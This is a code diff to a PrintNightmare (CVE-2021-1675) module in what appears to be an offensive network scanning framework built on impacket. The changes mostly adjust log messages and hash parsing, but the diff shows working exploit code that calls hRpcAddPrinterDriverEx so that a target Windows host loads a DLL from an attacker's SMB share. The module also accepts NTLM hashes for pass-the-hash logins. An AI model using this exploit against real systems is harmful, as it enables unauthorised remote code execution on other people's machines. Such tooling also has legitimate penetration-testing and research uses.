@@ -20,11 +20,11 @@ from impacket.structure import Structure
 
 class Module:
     name = 'PrintNightmare'
-    description = 'Check PrintNightmare vulnerability (CVE-2021-1675) (argument: IP for check or \'\\\\IP\\SHARE\\path\\to\\dll.dll\' for exploit)'
+    description = 'Check PrintNightmare vulnerability (CVE-2021-1675) [authenticated] (argument: IP for check or \'\\\\IP\\SHARE\\path\\to\\dll.dll\' for exploit)'
 
     def run(self, target, args, creds, timeout):
         if len(args) != 1:
-            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'PrintNightmare module requires 1 arg: -m printnightmare <listener_ip>'})
+            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': '[%s] PrintNightmare module requires 1 arg: -m printnightmare <listener_ip>' % self.name})
             return
         else:
             listener_ip = args[0]
@@ -37,8 +37,9 @@ class Module:
         dc_ip = creds['dc_ip'] if 'dc_ip' in creds else None
 
         if user == None:
-            Output.highlight({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'Printnightmare module works best with an account !'})
+            Output.highlight({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': '[%s] Printnightmare module works best with an account !' % self.name})
 
+        Output.minor({'target': 'smb://%s:%d' % (target['hostname'], 445), 'message': '[%s] Running module...' % self.name})
 
         check(target['hostname'], target['port'], listener_ip, domain, user, password, ntlm_hash, do_kerberos, dc_ip, timeout)
 
@@ -47,7 +48,11 @@ def check(ip, port, listener_ip, domain, username, password, ntlm_hash, do_kerbe
     do_kerberos = False
     pipe = 'lsarpc'
     if len(ntlm_hash) != 0:
-        lmhash, nthash = ntlm_hash.split(':')
+        if not ':' in ntlm_hash:
+            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+            nthash = ntlm_hash.lower()
+        else:
+            lmhash, nthash = ntlm_hash.split(':')
     else:
         lmhash = ''
         nthash = ''
@@ -99,7 +104,7 @@ def check(ip, port, listener_ip, domain, username, password, ntlm_hash, do_kerbe
     #re-run if stage0/stageX fails
     for i in range(3):
         #print("[*] Try 1...")
-        completed = exploit(dce, pDriverPath, listener_share)
+        completed = exploit(ip, dce, pDriverPath, listener_share)
         if completed:
             break
 
@@ -171,7 +176,7 @@ def getDriver(dce, handle=NULL):
     #print("[-] Failed to find driver")
     return None
 
-def exploit(dce, pDriverPath, share, handle=NULL):
+def exploit(ip, dce, pDriverPath, share, handle=NULL):
     completed = False
     
     try:
@@ -190,7 +195,7 @@ def exploit(dce, pDriverPath, share, handle=NULL):
         filename = share.split("\\")[-1]
 
         # During the check (not exploitation) a ERROR_PATH_NOT_FOUND is raised here
-        Output.highlight("Printnightmare first step completed, check your SMB server")
+        Output.highlight({'target': 'smb://%s:%d' % (ip, 445), 'message': '[PrintNightmare] First step completed, check your SMB server'})
         resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
         #print("[*] Stage0: {0}".format(resp['ErrorCode']))
 
@@ -201,7 +206,7 @@ def exploit(dce, pDriverPath, share, handle=NULL):
                 resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
                 #print("[*] Stage{0}: {1}".format(i, resp['ErrorCode']))
                 if (resp['ErrorCode'] == 0):
-                    Output.highlight("Printnightmare exploit completed")
+                    Output.highlight({'target': 'smb://%s:%d' % (ip, 445), 'message': '[PrintNightmare] Exploit completed'})
                     completed = True
                     break
             except Exception as e:
